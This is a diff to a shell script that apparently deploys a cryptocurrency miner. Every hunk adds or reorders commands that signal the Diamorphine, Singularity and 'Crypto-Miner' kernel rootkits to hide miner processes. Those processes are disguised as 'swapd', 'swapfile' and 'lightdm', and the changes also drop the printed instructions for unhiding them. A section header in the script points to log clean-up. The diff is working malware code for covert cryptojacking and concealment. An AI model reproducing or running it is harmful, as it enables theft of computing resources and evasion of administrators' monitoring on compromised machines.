@@ -1631,44 +1631,48 @@ echo ""
 echo "[*] Hiding miner processes..."
 sleep 3  # Give processes time to fully start before sending signals
 
-# ---- Singularity (kernel 6.x) — signal 59 = toggle visibility ----
-if [ "$SINGULARITY_LOADED" = true ]; then
-    echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
+# ---- Diamorphine — signal 31 = hide, signal 63 = confirm hide ----
+if lsmod | grep -q "^diamorphine" 2>/dev/null; then
+    echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
 
-    kill -59 `/bin/ps ax -fu $USER | grep "swapd"    | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "swapfile"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "lightdm"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
 
-    echo "[✓] Processes hidden with Singularity (kill -59)"
+
+    echo "[✓] Processes hidden with Diamorphine (kill -31)"
 else
-    echo "[*] Singularity not loaded — skipping"
+    echo "[*] Diamorphine not loaded — skipping"
 fi
 
-# ---- Crypto-Miner rootkit — signal 31 = hide ----
+# ---- Crypto-Miner rootkit — signal 31 = hide, signal 63 = confirm hide ----
 if lsmod | grep -q "^rootkit" 2>/dev/null; then
     echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
 
-    kill -31 `/bin/ps ax -fu $USER | grep "swapd"    | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapfile"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+
 
     echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
 else
     echo "[*] Crypto-Miner rootkit not loaded — skipping"
 fi
 
-# ---- Diamorphine — signal 31 = hide, signal 63 = unhide (we only hide here) ----
-if lsmod | grep -q "^diamorphine" 2>/dev/null; then
-    echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
+# ---- Singularity (kernel 6.x) — signal 59 = toggle visibility ----
+if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/null; then
+    echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
 
-    kill -31 `/bin/ps ax -fu $USER | grep "swapd"    | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapfile"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 $(pgrep -f -u root config.json) 2>/dev/null || true
+    kill -59 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
 
-    echo "[✓] Processes hidden with Diamorphine (kill -31)"
-    echo "[*] To unhide: kill -63 \`/bin/ps ax -fu \$USER | grep swapd | grep -v grep | awk '{print \$2}'\`"
+    echo "[✓] Processes hidden with Singularity (kill -59)"
 else
-    echo "[*] Diamorphine not loaded — skipping"
+    echo "[*] Singularity not loaded — skipping"
 fi
 
 # ==================== CLEAN UP LOGS ====================
@@ -2005,24 +2009,31 @@ echo ""
 echo "[*] Hiding processes with rootkit commands..."
 sleep 2  # Ensure services are fully up before sending signals
 
-# ---- Diamorphine: signal 31 = hide, signal 63 = unhide ----
+# ---- Diamorphine: signal 31 = hide, signal 63 = confirm hide ----
 if lsmod | grep -q "^diamorphine" 2>/dev/null; then
     echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
+
+    kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+
+
     echo "[✓] Processes hidden with Diamorphine (kill -31)"
-    echo "[*] To unhide: kill -63 \`/bin/ps ax -fu \$USER | grep swapd | grep -v grep | awk '{print \$2}'\`"
 else
     echo "[*] Diamorphine not loaded — skipping"
 fi
 
-# ---- Crypto-Miner rootkit: signal 31 = hide ----
+# ---- Crypto-Miner rootkit: signal 31 = hide, signal 63 = confirm hide ----
 if lsmod | grep -q "^rootkit" 2>/dev/null; then
     echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
+
+    kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+
+
     echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
 else
     echo "[*] Crypto-Miner rootkit not loaded — skipping"
@@ -2031,9 +2042,12 @@ fi
 # ---- Singularity (kernel 6.x): signal 59 = toggle visibility ----
 if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/null; then
     echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
+
+    kill -59 $(pgrep -f -u root config.json) 2>/dev/null || true
     kill -59 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -59 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
     kill -59 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+
     echo "[✓] Processes hidden with Singularity (kill -59)"
 else
     echo "[*] Singularity not loaded — skipping"
